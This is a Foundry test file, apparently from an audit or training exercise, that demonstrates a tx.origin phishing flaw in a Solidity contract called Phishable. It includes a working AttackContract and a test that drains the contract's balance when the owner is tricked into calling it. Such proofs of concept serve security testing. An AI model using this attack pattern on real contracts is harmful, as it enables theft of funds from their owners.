
// SPDX-License-Identifier: MIT
pragma solidity 0.8.29;

import {Test} from "../lib/forge-std/src/Test.sol";
import {Phishable} from "../src/Phishable.sol";

contract AttackContract {
    Phishable public target;
    address payable public attacker;

    constructor(Phishable _target, address payable _attacker) {
        target = _target;
        attacker = _attacker;
    }

    function attack() external {
        target.withdrawAll(attacker);
    }
}

contract TestAccessControlPhishable is Test {
    Phishable public _contractUnderTest;
    address public owner;

    function setUp() public {
        owner = makeAddr("owner");
        _contractUnderTest = new Phishable(owner);
        vm.deal(address(_contractUnderTest), 10 ether);
    }

    function test_highlightArbitraryUserCanAccess(address caller) public {
        // --- 1. Constraints ---
        vm.assume(caller != address(this));
        vm.assume(caller != address(0));
        vm.assume(caller != address(vm));
        vm.assume(caller != 0x000000000000000000636F6e736F6c652e6c6f67);
        
        // Exclude the owner since they are the privileged role
        vm.assume(caller != owner);
        
        // Exclude precompiles
        vm.assume(caller > address(0x10));

        // --- 2. State Configuration ---
        vm.deal(caller, 1 ether);

        // --- 3. Execution & Assertion ---
        
        // The vulnerability is that tx.origin is used instead of msg.sender
        // An attacker can create a malicious contract that calls withdrawAll
        // If the owner interacts with the attacker's contract, tx.origin will be owner
        // but msg.sender will be the attacker's contract
        
        // Deploy attack contract
        AttackContract attackContract = new AttackContract(_contractUnderTest, payable(caller));
        
        uint256 contractBalanceBefore = address(_contractUnderTest).balance;
        uint256 callerBalanceBefore = caller.balance;
        
        // Simulate owner being tricked into calling the attack contract
        // tx.origin will be owner, allowing the check to pass
        vm.prank(owner, owner);
        attackContract.attack();
        
        // Assert that funds were stolen
        assertEq(address(_contractUnderTest).balance, 0);
        assertEq(caller.balance, callerBalanceBefore + contractBalanceBefore);
    }
}
